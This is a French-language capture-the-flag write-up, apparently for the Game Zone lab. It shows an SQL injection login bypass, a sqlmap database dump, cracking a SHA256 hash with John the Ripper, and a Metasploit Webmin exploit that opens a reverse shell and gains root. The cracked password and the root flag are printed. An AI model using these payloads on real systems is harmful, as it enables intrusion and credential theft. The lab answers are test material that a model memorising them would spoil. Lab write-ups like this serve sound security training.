### Objectif

Exploiter une vulnérabilité SQLi pour obtenir des mots de passe à craquer avec john et avoir un accès distant à la cible et utiliser metasploitable pour l’élevation de privilèges

### Task1: Deploy the vulnerable machine

Lancer la machine vulnérable pour obtenir une adresse ip et ensuite se rendre sur la page d’acceuil via `http://machine_ip`

### Task2: Obtain access via SQLi

La page d’acceuil présente un formulaire de connexion. On peut se connecter sans mot de passe avec le payload dans le champ username et un mot de passe aléatoire. 

```sql
' OR 1=1-- -
```

L’application est donc vulnérable à une SQLi.On est redirigé vers la page portal.php

Question: When you've logged in, what page do you get redirected to?

```
portal.php
```

### Task3: Using SQLmap

L’objectif ici est de récupérer les données de la base de donnée. La page portal.php est une page de recherche. On teste dans le champ de recherche test et on intercepte la requête via BurpSuite qu’on copie dans un fichier request.txt

Exemple de contenu de request.txt

```
POST /portal.php HTTP/1.1
Host: lab.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://lab.thm
Connection: keep-alive
Referer: http://lab.thm/portal.php
Cookie: PHPSESSID=o3bsihnklko2ak2fi6oretqms3
Upgrade-Insecure-Requests: 1
Priority: u=0, i

searchitem=test
```

On peut donc passez ce fichier à sqlmap

```bash
sqlmap -r request.txt --dbms=mysql --dump
```

### Task4: Cracking a password with John The Ripper

L’objectif est de cracker le hash de agent47 obtenu via John the Ripper. Après avoir copié le mot de passe dans hash.txt on exécute pour détecter la version du hash 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

On obtient

```
Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-SHA256"

```

On peut donc cracher le hash avec le format `Raw-SHA256`

```bash
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Ainsi ,

1. What is the de-hashed password?

```
videogamer124
```

### Task6 : Privilege Escalation with Metasploit

L’objectif est d’utiliser metasploitable pour obtenir un accès root en exploitation la version vulnérable de webmin

```bash
# msfconsole
msf > search -name=webmin 1.580
msf > use 0
msf exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
msf exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
msf exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 192.168.148.105
msf exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
msf exploit(unix/webapp/webmin_show_cgi_exec) > set ssl fal
msf exploit(unix/webapp/webmin_show_cgi_exec) > run
```

Le payload choisis est `cmd/unix/reverse` car la cible est un système unix(Linux) et le tunnel `10000:localhost:10000` est en raison de l’incapacité d’accéder au service via l’extérieur.

On obtient un accès root à la machine donc on stabilise le shell et on récupère le flag

```bash
python3 --version
Python 3.5.2
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@gamezone:/usr/share/webmin/file/# ls /root
ls /root

root@gamezone:/usr/share/webmin/file/# cat /root/root.txt
cat /root/root.txt
a4b945830144bdd71908d12d902adeee
root@gamezone:/usr/share/webmin/file/# 

```

Le flag est donc

```
a4b945830144bdd71908d12d902adeee
```
